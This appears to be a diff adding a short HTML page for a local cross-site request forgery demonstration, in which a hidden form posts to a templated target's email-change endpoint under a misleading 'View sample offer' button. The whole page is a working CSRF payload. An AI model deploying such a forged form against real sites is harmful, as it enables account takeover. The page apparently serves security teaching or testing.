@@ -1,0 +1,13 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><title>Local CSRF demonstration</title></head>
+<body style="font:18px system-ui;max-width:800px;margin:40px auto">
+  <h1>CSRF demonstration</h1>
+  <p>After logging in to the target, press the button below. This page submits a
+     cross-origin form using the existing session cookie without a CSRF token.</p>
+  <form id="forged-form" method="post" action="{{TARGET_ORIGIN}}/profile/email">
+    <input type="hidden" name="email" value="attacker@example.test">
+    <button id="csrf-submit">View sample offer</button>
+  </form>
+  <p>Expected result: the target account shows <strong>attacker@example.test</strong>.
+     The demonstration changes only this synthetic local account.</p>
+</body></html>
